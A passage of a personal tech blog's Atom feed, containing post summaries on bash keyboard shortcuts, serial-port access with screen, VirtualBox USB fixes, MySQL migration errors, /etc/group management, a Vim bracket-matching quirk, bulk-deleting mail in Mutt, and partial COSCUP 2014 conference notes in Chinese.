&lt;td&gt;Cut the Word before the cursor to the clipboard.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + k&lt;/td&gt;
&lt;td&gt;Cut the Line after the cursor to the clipboard.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + t&lt;/td&gt;
&lt;td&gt;Swap current word with previous&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + t&lt;/td&gt;
&lt;td&gt;Swap the last two characters before the cursor (typo).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Esc  + t&lt;/td&gt;
&lt;td&gt;Swap the last two words before the cursor.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + y&lt;/td&gt;
&lt;td&gt;Paste the last thing to be cut (yank)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + u&lt;/td&gt;
&lt;td&gt;UPPER capitalize every character from the cursor to the end of the current word.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + l&lt;/td&gt;
&lt;td&gt;Lower the case of every character from the cursor to the end of the current word.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + c&lt;/td&gt;
&lt;td&gt;Capitalize the character under the cursor and move to the end of the word.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Alt + r&lt;/td&gt;
&lt;td&gt;Cancel the changes and put back the line as it was in the history (revert).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + _&lt;/td&gt;
&lt;td&gt;Undo&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;TAB&lt;/td&gt;
&lt;td&gt;Tab completion for file/directory names.  For example, to move to a directory            'sample1'; Type cd sam ; then press TAB and ENTER.  type just enough characters to uniquely identify  the directory you wish to open.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;History&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Hotkey&lt;/th&gt;
&lt;th&gt;Detail&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + r&lt;/td&gt;
&lt;td&gt;Recall the last command including the specified character(s) searches the command history as you type. Equivalent to : vim ~/.bash_history.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + p&lt;/td&gt;
&lt;td&gt;Previous command in history (i.e. walk back through the command history)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + n&lt;/td&gt;
&lt;td&gt;Next command in history (i.e. walk forward through the command history)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + s&lt;/td&gt;
&lt;td&gt;Go back to the next most recent command. (beware to not execute it from a terminal because this will also launch its XOFF).&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + o&lt;/td&gt;
&lt;td&gt;Execute the command found via Ctrl+r or Ctrl+s&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + g&lt;/td&gt;
&lt;td&gt;Escape from history searching mode&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!!&lt;/td&gt;
&lt;td&gt;Repeat last command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!abc&lt;/td&gt;
&lt;td&gt;Run last command starting with abc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!abc:p&lt;/td&gt;
&lt;td&gt;Print last command starting with abc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!$&lt;/td&gt;
&lt;td&gt;Last argument of previous command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;ALT + .&lt;/td&gt;
&lt;td&gt;Last argument of previous command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;!*&lt;/td&gt;
&lt;td&gt;All arguments of previous command&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;^abc­^­def&lt;/td&gt;
&lt;td&gt;Run previous command, replacing abc with def&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;Process control&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Hotkey&lt;/th&gt;
&lt;th&gt;Detail&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + C&lt;/td&gt;
&lt;td&gt;Interrupt/Kill whatever you are running (SIGINT)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + l&lt;/td&gt;
&lt;td&gt;Clear the screen&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + s&lt;/td&gt;
&lt;td&gt;Stop output to the screen (for long running verbose commands)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + q&lt;/td&gt;
&lt;td&gt;Allow output to the screen (if previously stopped using command above)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + D&lt;/td&gt;
&lt;td&gt;Send an EOF marker, unless disabled by an option, this will close the current shell (EXIT)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Ctrl + Z&lt;/td&gt;
&lt;td&gt;Send the signal SIGTSTP to the current task, which suspends it. To return to it later enter fg 'process name' (foreground).&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;Emacs mode vs Vi Mode&lt;/h2&gt;
&lt;p&gt;All the above assume that bash is running in the default Emacs setting, if you prefer this can be switched to Vi shortcuts instead.  &lt;/p&gt;
&lt;p&gt;Set Vi Mode in bash:&lt;br /&gt;
&lt;code&gt;$ set -o vi&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;Set Emacs Mode in bash:&lt;br /&gt;
&lt;code&gt;$ set -o emacs&lt;/code&gt;  &lt;/p&gt;
&lt;h1&gt;References&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;English  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://ss64.com/bash/syntax-keyboard.html"&gt;Bash Keyboard Shortcuts&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.slashroot.in/bash-shell-shortcuts-every-system-administrator-must-know"&gt;Bash shell shortcuts that every system administrator must know&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.skorks.com/2009/09/bash-shortcuts-for-maximum-productivity/"&gt;Bash Shortcuts For Maximum Productivity&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Chinese  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.longwin.com.tw/2006/09/bash_hot_key_2006/"&gt;Bash Shell 快速鍵&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://roclinux.cn/?p=864"&gt;休息五分钟，学几个bash快捷键&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://linuxtoy.org/archives/bash-shortcuts.html"&gt;让你提升命令行效率的 Bash 快捷键 [完整版]&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="bash"></category><category term="Cheat Sheet"></category></entry><entry><title>Use screen Command to Access Serial Port</title><link href="https://blog.m157q.tw/posts/2014/10/16/use-screen-command-to-access-serial-port/" rel="alternate"></link><published>2014-10-16T08:12:00+08:00</published><updated>2014-10-16T08:12:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-16:posts/2014/10/16/use-screen-command-to-access-serial-port/</id><summary type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ screen /dev/ttyS0 &lt;span class="m"&gt;19200&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;This command simply opens up a connection to serial port 0 (ttyS0) with a baud speed/rate of 19200  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://apple.stackexchange.com/questions/32834/is-there-an-os-x-terminal-program-that-can-access-serial-ports"&gt;Is there an OS X terminal program that can access serial ports?&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://serverfault.com/questions/81544/hidden-features-of-screen/81548"&gt;Hidden Features of &lt;code&gt;screen&lt;/code&gt;&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="screen"></category><category term="serial port"></category></entry><entry><title>Solution for the Failure to Attach USB Device in VirtualBox</title><link href="https://blog.m157q.tw/posts/2014/10/16/solution-for-the-failure-to-attach-usb-device-in-virtualbox/" rel="alternate"></link><published>2016-05-03T20:32:00+08:00</published><updated>2016-05-03T20:32:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-10-16:posts/2014/10/16/solution-for-the-failure-to-attach-usb-device-in-virtualbox/</id><summary type="html">&lt;h2&gt;Solution&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://forums.virtualbox.org/viewtopic.php?t=10276"&gt;virtualbox.org • View topic - Failed to Attach the USB Device SigmaTel, Inc. STIr42xx&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Steps&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;Settings  &lt;/li&gt;
&lt;li&gt;Ports  &lt;/li&gt;
&lt;li&gt;USB  &lt;/li&gt;
&lt;li&gt;Add a new USB Filter  &lt;/li&gt;
&lt;li&gt;Choose device which cannot be attached  &lt;/li&gt;
&lt;li&gt;Clear all fields except the name  &lt;/li&gt;
&lt;li&gt;Unplug the USB device  &lt;/li&gt;
&lt;li&gt;Plug in the USB device again  &lt;/li&gt;
&lt;li&gt;Attach the USB device to guest  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This method should work.  &lt;/p&gt;</summary><category term="VirtualBox"></category><category term="USB"></category></entry><entry><title>Some Problems Encountered During MySQL Migration</title><link href="https://blog.m157q.tw/posts/2014/08/31/some-problems-encountered-during-mysql-migration/" rel="alternate"></link><published>2015-10-26T14:48:00+08:00</published><updated>2015-10-26T14:48:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-08-31:posts/2014/08/31/some-problems-encountered-during-mysql-migration/</id><summary type="html">&lt;h3&gt;Some encountered errors&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;ERROR 1215 (HY000): Cannot add foreign key constraint&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;in mysql shell: &lt;code&gt;SET GLOBAL FOREIGN_KEY_CHECKS = 0;&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;in mysql =&amp;gt; not worked  &lt;/li&gt;
&lt;li&gt;add into backup.sql =&amp;gt; not worked  &lt;/li&gt;
&lt;li&gt;finally deleted the foreign key constraint line in &lt;code&gt;backup.sql&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ERROR 1367 (22007): Illegal double&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;$ replace 1.79769313486232e+308 \'1.79769313486232e+308\' -- backup.sql&lt;/code&gt; can solve the problem (bug).  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;Backup&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;On local server  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysqldump -f --all-databases --password='xxx' &amp;gt; /tmp/bakcup.sql&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Use &lt;code&gt;scp&lt;/code&gt; or other command to transfter the &lt;code&gt;backup.sql&lt;/code&gt; to destination server  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Restore&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;On destination server  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;mysql -u user -p &amp;lt; /tmp/backup.sql&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Use the Force&lt;/h4&gt;
&lt;p&gt;&lt;code&gt;mysql --force -u user -p &amp;lt; /tmp/backup.sql&lt;/code&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Backup / Restore  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://snipt.net/danfreak/backup-and-restore-all-mysql-databases-with-2-simple-commands/"&gt;https://snipt.net/danfreak/backup-and-restore-all-mysql-databases-with-2-simple-commands/&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ERROR 1215 (HY000): Cannot add foreign key constraint  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://forums.mysql.com/read.php?35,581311,581311#msg-581311"&gt;http://forums.mysql.com/read.php?35,581311,581311#msg-581311&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/16608042/error-1215-hy000-cannot-add-foreign-key-constraint"&gt;http://stackoverflow.com/questions/16608042/error-1215-hy000-cannot-add-foreign-key-constraint&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/18930084/mysql-error-1215-hy000-cannot-add-foreign-key-constraint"&gt;http://stackoverflow.com/questions/18930084/mysql-error-1215-hy000-cannot-add-foreign-key-constraint&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://dev.mysql.com/doc/refman/5.6/en/server-system-variables.html#sysvar_foreign_key_checks"&gt;http://dev.mysql.com/doc/refman/5.6/en/server-system-variables.html#sysvar_foreign_key_checks&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ERROR 1367 (22007): Illegal double  &lt;ul&gt;
&lt;li&gt;&lt;a href="http://dba.stackexchange.com/questions/7885/error-on-import-of-mysqldump-file-illegal-double-value-found-during-parsing"&gt;http://dba.stackexchange.com/questions/7885/error-on-import-of-mysqldump-file-illegal-double-value-found-during-parsing&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://bugs.mysql.com/bug.php?id=44995"&gt;http://bugs.mysql.com/bug.php?id=44995&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="MySQL"></category><category term="Database"></category><category term="sysadmin"></category></entry><entry><title>Manage /etc/group and /etc/gshadow</title><link href="https://blog.m157q.tw/posts/2014/08/12/manage-etcgroup-and-etcgshadow/" rel="alternate"></link><published>2014-08-12T20:45:00+08:00</published><updated>2014-08-12T20:45:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-08-12:posts/2014/08/12/manage-etcgroup-and-etcgshadow/</id><summary type="html">&lt;ul&gt;
&lt;li&gt;&lt;code&gt;# vigr&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;edit &lt;code&gt;/etc/group&lt;/code&gt; file  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# grpconv&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;generate new &lt;code&gt;/etc/gshadow&lt;/code&gt; file based on &lt;code&gt;/etc/group&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;# grpck&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;cross-comparison the members in groups of &lt;code&gt;/etc/group&lt;/code&gt; and &lt;code&gt;/etc/gshadow&lt;/code&gt;, it will also detect wrong or useless syntax.  &lt;/li&gt;
&lt;li&gt;(For me, it's a little bit like tell you the result of &lt;code&gt;vimdiff /etc/group /etc/gshadow&lt;/code&gt; directly)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="sysadmin"></category><category term="vigr"></category><category term="grpck"></category><category term="grpconv"></category><category term="gshadow"></category></entry><entry><title>Wrong % (matching parens searching) action in Vim</title><link href="https://blog.m157q.tw/posts/2014/08/12/wrong-matching-parens-searching-action-in-vim/" rel="alternate"></link><published>2015-10-26T13:04:00+08:00</published><updated>2015-10-26T13:04:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-08-12:posts/2014/08/12/wrong-matching-parens-searching-action-in-vim/</id><summary type="html">&lt;p&gt;&lt;code&gt;cpoptions&lt;/code&gt; in Vim is so complicated...  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;{'{,''}’}&lt;/code&gt; this pattern will cause a wrong &lt;code&gt;%&lt;/code&gt; action (MATCHING PARENTHESES SEARCH) in Vim with default &lt;code&gt;cpoptions&lt;/code&gt; flag.  &lt;/p&gt;
&lt;p&gt;A real Example in JavaScript  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;indexOf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;\n &amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="nx"&gt;space&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
    &lt;span class="nx"&gt;item&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;options&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;pedantic&lt;/span&gt;  
      &lt;span class="o"&gt;?&lt;/span&gt; &lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;RegExp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;^ {1,&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;space&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;}&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;gm&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
      &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/^ {1,4}/gm&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And if we &lt;code&gt;:set cpoptions&amp;amp;vi&lt;/code&gt; to change cpoptions let Vim act like VI, the result seems correct.  &lt;/p&gt;
&lt;p&gt;But after read the doc in Vim, proved it was a coincidence because VI just treat this pattern a PLAINTEXT without considering parens in &lt;code&gt;“”&lt;/code&gt; or &lt;code&gt;''&lt;/code&gt;. So, if you remove one of the parens, the result get wrong again.  &lt;/p&gt;
&lt;p&gt;What I am curious about is that the default syntax highlighting is correct but the % action is wrong in Vim with such pattern.  &lt;/p&gt;
&lt;p&gt;I know install a plugin like matchit can probably resolve this problem. But is there any built-in method to deal with it?  &lt;/p&gt;
&lt;p&gt;My friend found this problem while he was trying to fold his code and got an unpredictable result.  &lt;/p&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/1903225/vim-finds-incorrect-matching-bracket-when-using"&gt;Vim finds incorrect matching bracket when using %&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Vim"></category></entry><entry><title>Delete all mails in Mutt</title><link href="https://blog.m157q.tw/posts/2014/08/01/delete-all-mails-in-mutt/" rel="alternate"></link><published>2015-10-26T14:51:00+08:00</published><updated>2015-10-26T14:51:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-08-01:posts/2014/08/01/delete-all-mails-in-mutt/</id><summary type="html">&lt;h2&gt;How-to&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;D&lt;/code&gt; - press &lt;strong&gt;Shift-d&lt;/strong&gt; (delete pattern)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;~s .*&lt;/code&gt; then press &lt;strong&gt;enter&lt;/strong&gt;. Mutt will flag all mail with a D.  &lt;ul&gt;
&lt;li&gt;or just &lt;code&gt;.*&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;q&lt;/code&gt; to quit mutt  &lt;ul&gt;
&lt;li&gt;confirm deletion before exit.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;another way  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;T&lt;/code&gt; - tag pattern mode  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;~s .*&lt;/code&gt; -  tag all mails  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;;d&lt;/code&gt; - delete tagged mails  &lt;/li&gt;
&lt;li&gt;$ (&lt;strong&gt;Shift+4&lt;/strong&gt;) - to sync change to your mailbox or &lt;code&gt;q&lt;/code&gt; to quit mutt  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://major.io/2009/06/19/deleting-all-e-mail-messages-in-your-inbox-with-mutt/"&gt;Deleting all e-mail messages in your inbox with mutt&lt;/a&gt;  &lt;/p&gt;</summary><category term="CLI"></category><category term="Mutt"></category></entry><entry><title>COSCUP 2014 Notes and Thoughts</title><link href="https://blog.m157q.tw/posts/2014/07/20/coscup-2014-notes-and-thoughts/" rel="alternate"></link><published>2015-10-28T12:55:00+08:00</published><updated>2015-10-28T12:55:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-07-20:posts/2014/07/20/coscup-2014-notes-and-thoughts/</id><summary type="html">&lt;p&gt;前面是有點長的廢話:  &lt;/p&gt;
&lt;p&gt;今年的日期和 HITCON 對調，改到了七月  &lt;/p&gt;
&lt;p&gt;報到使用了感應式門框 速度超級快  &lt;/p&gt;
&lt;p&gt;上千人報到也都不用等 真的很棒  &lt;/p&gt;
&lt;p&gt;最近的 Conf 都是 IRC(看即時狀況) + Hackpad(筆記)  &lt;/p&gt;
&lt;p&gt;但 Hackpad 對中文輸入的支援實在還是沒有很好  &lt;/p&gt;
&lt;p&gt;所以除了打 code 跟 英文筆記以外 我實在不太想用 hackpad  &lt;/p&gt;
&lt;p&gt;不知道哪時候才有辦法解決這種共筆網站的輸入問題  &lt;/p&gt;
&lt;p&gt;google drive 似乎就沒有這個問題的樣子  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;今年最紅的應該就是桌機哥了吧&lt;br /&gt;
&lt;img alt="桌機哥" src="/files/coscup-2014-notes-and-thoughts/desktop-bro.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;不但被人 &lt;a href="http://www.plurk.com/p/k81ob1"&gt;拍照放到噗浪上&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;還成立了 &lt;a href="https://www.facebook.com/pages/%E6%A1%8C%E6%A9%9F%E5%93%A5/742954022410671"&gt;Facebook 粉絲團&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;不知道會不會掀起自帶主機和螢幕參加 conf 的風潮  &lt;/p&gt;
&lt;p&gt;梗的話就參考 &lt;a href="https://coscup.hackpad.com/COSCUP2014--9DNfsNGRcZX"&gt;hackpad 的梗全集&lt;/a&gt; 吧  &lt;/p&gt;
&lt;p&gt;但應該還是有很多散落在 irc log 和共筆中  &lt;/p&gt;
&lt;p&gt;今年還是一樣沒認識什麼人  &lt;/p&gt;
&lt;p&gt;大概就是個性使然  &lt;/p&gt;
&lt;p&gt;明年想找機會投稿  &lt;/p&gt;
&lt;p&gt;沒機會投稿也要弄個貢獻者專案拿票  &lt;/p&gt;
&lt;p&gt;不想再搶票啦!  &lt;/p&gt;
&lt;p&gt;不過近年來好像真的都是以推廣和發表新作品居多  &lt;/p&gt;
&lt;p&gt;--廠商的贊助廣告也越來越多啦 滿滿整個小袋子--  &lt;/p&gt;
&lt;p&gt;看來要比較多技術性還是得期待 OSDC  &lt;/p&gt;
&lt;p&gt;但是我這種小廢物去 OSDC 的時候又覺得有些聽不太懂  &lt;/p&gt;
&lt;p&gt;所以還是努力加強自己的實力吧...  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;嗯 廢話完畢  &lt;/p&gt;
&lt;p&gt;所有相關共筆可以參考 &lt;a href="https://coscup.hackpad.com"&gt;https://coscup.hackpad.com&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;或是直接看 &lt;a href="http://hackfoldr.org/coscup2014"&gt;hack folder 整合&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;有現場聽的議程我幾乎都有在 hackpad 做共筆  &lt;/p&gt;
&lt;p&gt;(雖然常常當掉要一直狂 refresh 但還是覺得就是應該用共同筆記 而不是自己弄自己的 這樣才有 Open Source 的感覺啊)  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Lightning Talks&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;數位時代  &lt;ul&gt;
&lt;li&gt;感應門報到  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;hlb  &lt;ul&gt;
&lt;li&gt;KKTIX  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OpenATC  &lt;ul&gt;
&lt;li&gt;http://www.openatc.club/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;penk  &lt;ul&gt;
&lt;li&gt;https://github.com/penk/terrarium-app  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;COSCUP 的便當  &lt;ul&gt;
&lt;li&gt;http://shiapic.loliconis.me/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;KDockerWeb - Docker Web 管理界面  &lt;ul&gt;
&lt;li&gt;https://github.com/tsaikd/kdocker-web  &lt;/li&gt;
&lt;li&gt;http://tsaikd.org/kdocker-web/  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;硬是要 69 - YuTin  &lt;ul&gt;
&lt;li&gt;66K - xdite  &lt;/li&gt;
&lt;li&gt;67K - tirky  &lt;/li&gt;
&lt;li&gt;69K 因為我愛 69 !  &lt;ul&gt;
&lt;li&gt;Google Forms  &lt;/li&gt;
&lt;li&gt;Google Public API  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;攝護線  &lt;ul&gt;
&lt;li&gt;大腸花、白色正義協助直播  &lt;/li&gt;
&lt;li&gt;要突破警察的黑畫面  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.inlive.tw"&gt;http://www.inlive.tw&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open Source Job Board - Sammy Fung  &lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/sammyfung/drupal7-job"&gt;https://github.com/sammyfung/drupal7-job&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;自己的遊戲產業自己救 - Johnson Lin  &lt;ul&gt;
&lt;li&gt;我的 Open Office crash 啦  &lt;ul&gt;
